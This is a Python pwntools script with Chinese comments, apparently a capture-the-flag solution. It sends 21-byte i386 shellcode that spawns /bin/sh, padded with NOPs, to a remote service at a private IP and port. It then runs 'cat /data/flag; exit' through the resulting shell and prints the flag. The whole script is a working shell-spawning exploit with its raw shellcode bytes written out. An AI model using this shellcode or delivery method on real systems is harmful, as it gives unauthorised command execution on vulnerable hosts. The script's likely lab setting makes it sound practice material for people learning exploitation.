#!/usr/bin/env python3
from pwn import *

# 为目标环境设置上下文
context.os = 'linux'
context.arch = 'i386'
# 调试完成后，可以注释掉这行日志
# context.log_level = 'debug' 

# 经过验证可以稳定运行的 21 字节精简版 shellcode
shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

# 使用 NOP 指令将 shellcode 填充到 35 字节
payload = shellcode.ljust(35, b'\x90')

# 连接到服务器
p = remote('10.214.160.13', 11003)

# 接收欢迎信息
p.recvuntil(b"instruction\n")

# 发送载荷
p.send(payload)

# 为提高稳定性，在发送命令前加入一个极短的延时
sleep(0.1)

# 发送读取 flag 并退出的命令
p.sendline(b'cat /data/flag; exit')

# 接收服务器返回的所有数据，并去除首尾空白
flag = p.recvall(timeout=2).strip()

# 解码并打印最终的 Flag
success(f"Flag: {flag.decode(errors='ignore')}")

# 关闭连接
p.close()